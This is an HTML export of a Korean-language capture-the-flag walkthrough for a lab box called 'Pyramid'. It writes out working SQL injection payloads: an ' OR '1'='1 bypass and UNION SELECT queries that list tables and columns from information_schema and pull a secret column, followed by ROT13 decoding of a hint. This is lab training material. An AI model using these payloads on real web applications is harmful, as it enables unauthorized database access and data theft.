<html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=utf-8">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:Gulim;
	panose-1:2 11 6 0 0 1 1 1 1 1;}
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:"Malgun Gothic";
	panose-1:2 11 5 3 2 0 0 2 0 4;}
@font-face
	{font-family:GulimChe;
	panose-1:2 11 6 9 0 1 1 1 1 1;}
@font-face
	{font-family:Consolas;
	panose-1:2 11 6 9 2 2 4 3 2 4;}
@font-face
	{font-family:"\@Malgun Gothic";}
@font-face
	{font-family:"\@GulimChe";}
@font-face
	{font-family:"\@Gulim";
	panose-1:2 11 6 0 0 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:8.0pt;
	margin-left:0in;
	text-align:justify;
	text-justify:inter-ideograph;
	line-height:107%;
	text-autospace:none;
	word-break:break-all;
	font-size:10.0pt;
	font-family:"Malgun Gothic",sans-serif;}
a:link, span.MsoHyperlink
	{color:#0563C1;
	text-decoration:underline;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:8.0pt;
	margin-left:40.0pt;
	text-align:justify;
	text-justify:inter-ideograph;
	line-height:107%;
	text-autospace:none;
	word-break:break-all;
	font-size:10.0pt;
	font-family:"Malgun Gothic",sans-serif;}
span.hljs-string
	{mso-style-name:hljs-string;}
span.hljs-number
	{mso-style-name:hljs-number;}
.MsoChpDefault
	{font-size:10.0pt;
	font-family:"Malgun Gothic",sans-serif;}
.MsoPapDefault
	{margin-bottom:8.0pt;
	text-align:justify;
	text-justify:inter-ideograph;
	line-height:107%;}
 /* Page Definitions */
 @page WordSection1
	{size:595.3pt 841.9pt;
	margin:85.05pt 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
 /* List Definitions */
 ol
	{margin-bottom:0in;}
ul
	{margin-bottom:0in;}
-->
</style>

</head>

<body lang=EN-US link="#0563C1" vlink="#954F72" style='word-wrap:break-word'>

<div class=WordSection1>

<p class=MsoNormal align=center style='text-align:center'><b><span
style='font-size:16.0pt;line-height:107%'>Pyramid 1<span lang=KO>단계 </span>SQLi
Walkthrough</span></b></p>

<p class=MsoNormal align=center style='text-align:center'><span
style='font-size:11.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoNormal align=center style='text-align:center'><span
style='font-size:11.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoNormal align=left style='text-align:left'><span style='font-size:
11.0pt;line-height:107%'>IP <span lang=KO>확인 후 </span>http <span lang=KO>접속</span></span></p>

<p class=MsoNormal><img width=643 height=549 id="그림 2"
src="1.이재민_ctf_문제풀이_files/image001.jpg"></p>

<p class=MsoNormal align=center style='text-align:center'><span
style='font-size:11.0pt;line-height:107%'>&nbsp;</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal align=center style='text-align:center'>&nbsp;</p>

<p class=MsoNormal align=left style='text-align:left'><span class=hljs-string><span
style='font-size:16.0pt;line-height:107%;font-family:Consolas;color:#6A8759'>'
OR '</span></span><span class=hljs-number><span style='font-size:16.0pt;
line-height:107%;font-family:Consolas;color:#6896BA'>1</span></span><span
class=hljs-string><span style='font-size:16.0pt;line-height:107%;font-family:
Consolas;color:#6A8759'>'='</span></span><span class=hljs-number><span
style='font-size:16.0pt;line-height:107%;font-family:Consolas;color:#6896BA'>1</span></span></p>

<p class=MsoNormal align=left style='text-align:left'><span lang=KO
style='font-size:11.0pt;line-height:107%'>가장 기본적인</span><span style='font-size:
11.0pt;line-height:107%'> SQLi <span lang=KO>입력해보기 </span>(<span lang=KO>모든 행을 반환</span>)</span></p>

<p class=MsoNormal align=center style='text-align:center'><img width=652
height=552 id="그림 1" src="1.이재민_ctf_문제풀이_files/image002.jpg"></p>

<p class=MsoNormal align=left style='margin-top:15.0pt;margin-right:0in;
margin-bottom:0in;margin-left:0in;text-align:left;line-height:normal;
text-autospace:ideograph-numeric ideograph-other;word-break:normal'><span
style='font-size:13.5pt;font-family:"Courier New"'>&nbsp;</span></p>

<p class=MsoNormal align=left style='margin-top:15.0pt;margin-right:0in;
margin-bottom:0in;margin-left:0in;text-align:left;line-height:normal;
text-autospace:ideograph-numeric ideograph-other;word-break:normal'><span
lang=KO style='font-size:13.5pt'>알 수 있는 사실</span></p>

<p class=MsoNormal align=left style='margin-top:15.0pt;margin-right:0in;
margin-bottom:0in;margin-left:0in;text-align:left;line-height:normal;
text-autospace:ideograph-numeric ideograph-other;word-break:normal'>&nbsp;</p>

<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
style='font-size:11.0pt;line-height:107%'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span lang=KO style='font-size:11.0pt;line-height:107%'>입력값이 필터링 없이</span><span
style='font-size:11.0pt;line-height:107%'> DB <span lang=KO>쿼리에 직접 사용되고 있다</span>.</span></p>

<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
style='font-size:11.0pt;line-height:107%'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span style='font-size:11.0pt;line-height:107%'>URL<span lang=KO>에서
파라미터</span> name <span lang=KO>노출되며 </span>GET <span lang=KO>방식으로 서버 전송되고있다</span>.</span></p>

<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
style='font-size:11.0pt;line-height:107%'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span style='font-size:11.0pt;line-height:107%'>php<span lang=KO>는
총 </span>3<span lang=KO>개의 칼럼만 표시하고 있다</span>.</span></p>

<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><span
style='font-size:11.0pt;line-height:107%'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span style='font-size:11.0pt;line-height:107%'>OR<span lang=KO>이
작동하는 것으로 보아 </span>SELECT, OR <span lang=KO>등이</span> php<span lang=KO>에서 필터링 되지
않고 있다</span>. (sql<span lang=KO>취약점존재</span>)</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoListParagraph align=left style='margin-left:38.0pt;text-align:left;
text-indent:-.25in'><b><span style='font-size:12.0pt;line-height:107%'>1.<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp; </span></span></b><b><span
lang=KO style='font-size:12.0pt;line-height:107%'>테이블명 추출하는 </span></b><b><span
style='font-size:12.0pt;line-height:107%'>SQLi <span lang=KO>실행</span></span></b></p>

<p class=MsoNormal align=left style='text-align:left'><span style='font-size:
16.0pt;line-height:107%;font-family:Consolas;color:#6A8759;background:#2B2B2B'>'
UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables
WHERE table_schema=database() --</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=664 height=519 id="그림 3"
src="1.이재민_ctf_문제풀이_files/image003.jpg"></p>

<p class=MsoNormal align=center style='text-align:center'><span
style='font-size:11.0pt;line-height:107%'>2<span lang=KO>번째 항목에 테이블이름 출력</span></span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><b><span
style='font-size:12.0pt;line-height:107%'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
</span></span></b><b><span lang=KO style='font-size:12.0pt;line-height:107%'>칼럼명을
추출하는 </span></b><b><span style='font-size:12.0pt;line-height:107%'>SQLi <span
lang=KO>실행</span></span></b></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><span class=hljs-string><span style='font-size:14.0pt;
line-height:107%;font-family:Consolas;color:#6A8759'>' UNION SELECT 1,
group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='</span></span><span
style='font-size:14.0pt;line-height:107%;font-family:Consolas;color:#BABABA;
background:#2B2B2B'>pharaohs</span><span class=hljs-string><span
style='font-size:14.0pt;line-height:107%;font-family:Consolas;color:#6A8759'>'
--</span></span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=661 height=473 id="그림 4"
src="1.이재민_ctf_문제풀이_files/image004.jpg"></p>

<p class=MsoNormal align=center style='text-align:center'>2<span lang=KO>번째 항목에
모든 칼럼명 출력</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoListParagraph style='margin-left:38.0pt;text-indent:-.25in'><b><span
style='font-size:12.0pt;line-height:107%'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
</span></span></b><b><span style='font-size:12.0pt;line-height:107%'>secret_info<span
lang=KO>에 담긴 최종힌트를 얻는 </span>SQLi <span lang=KO>실행</span></span></b></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%;font-family:
Consolas;color:#6A8759;background:#2B2B2B'>' UNION SELECT 1, 2, secret_info
FROM pharaohs WHERE id = 6 --</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=601 height=410 id="그림 5"
src="1.이재민_ctf_문제풀이_files/image005.jpg"></p>

<p class=MsoNormal align=center style='text-align:center'><span lang=KO>최종 힌트 획득</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=602 height=98 id="그림 6"
src="1.이재민_ctf_문제풀이_files/image006.jpg"></p>

<p class=MsoNormal align=center style='text-align:center'><span lang=KO>웹 페이지 소스에
담긴 주석 힌트</span> : <span lang=KO>엄청 긴 문자열</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=602 height=415 id="그림 7"
src="1.이재민_ctf_문제풀이_files/image007.jpg"></p>

<p class=MsoNormal align=center style='text-align:center'><span
style='color:black;background:#FCFCFC'>ROT13.com <span lang=KO>에서 디코딩</span></span></p>

<p class=MsoNormal align=left style='text-align:left'><span style='background:
#FCFCFC'>&nbsp;</span></p>

<p class=MsoNormal align=left style='text-align:left'><span style='color:black;
background:#FCFCFC'>&quot;<span lang=KO>파라오의 암호는 문지기의 열쇠를 위한 것이 아니라</span>, <span
lang=KO>펼쳐지는 나일강 지도의 논리를 위해 존재한다</span>. <span lang=KO>흐름을 따라 다음 방으로 나아가라</span>.&quot;</span></p>

<p class=MsoNormal align=left style='text-align:left'><span lang=KO
style='color:#222222'>이 문구는</span><span style='color:#222222'> SSH <span
lang=KO>접속 정보가 아님을 간접적으로 나타내며</span>, <span lang=KO>다음 웹 디렉토리를 이동해야 함을 비유적으로 알 수
있다</span>.</span></p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=577 height=62 id="그림 8"
src="1.이재민_ctf_문제풀이_files/image008.png"></p>

<p class=MsoNormal><span lang=KO>최종 힌트를 보면</span> '/' <span lang=KO>표시가 있는데</span>,
<span lang=KO>이것을 보고</span>&nbsp;<b><span lang=KO>디렉토리 경로</span></b><span
lang=KO>라는 것을 유추해볼 수 있다</span>.</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><span lang=KO>얻은 정보들을 바탕으로</span>
&quot;http://pyramidIP/the_architect_of_the_Great_Pyramid&quot; <span lang=KO>로
이동하면 다음 단계로 넘어간다</span>.</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><img width=601 height=379 id="그림 9"
src="1.이재민_ctf_문제풀이_files/image009.jpg"></p>

<p class=MsoNormal>trivia <span lang=KO>칼럼의 값들을 조회해보니 어떤 문구와 함께 </span>3000<span
lang=KO>자 분량의 반복되는 문자열이 나타난다</span>.</p>

<p class=MsoNormal><span lang=KO>해석해본 결과 </span>sqlmap <span lang=KO>자동화 기법이 아닌
수동 </span>SQLi<span lang=KO>를 유도하는것을 알 수 있다</span>.</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal><span lang=KO style='line-height:107%'>조금</span><span
lang=KO style='line-height:107%;font-family:"Arial",sans-serif'> </span><span
lang=KO style='line-height:107%'>더</span><span lang=KO style='line-height:107%;
font-family:"Arial",sans-serif'> </span><span lang=KO style='line-height:107%'>자세한</span><span
lang=KO style='line-height:107%;font-family:"Arial",sans-serif'> </span><span
lang=KO style='line-height:107%'>풀이</span><span style='line-height:107%;
font-family:"Arial",sans-serif'> : </span><a
href="https://mini97.tistory.com/97"><span style='line-height:107%;font-family:
"Arial",sans-serif'>https://mini97.tistory.com/97</span></a><span
style='line-height:107%;font-family:"Arial",sans-serif'>  </span><span lang=KO
style='line-height:107%'>비밀번호</span><span style='line-height:107%;font-family:
"Arial",sans-serif'>:cmd</span></p>

</div>

</body>

</html>
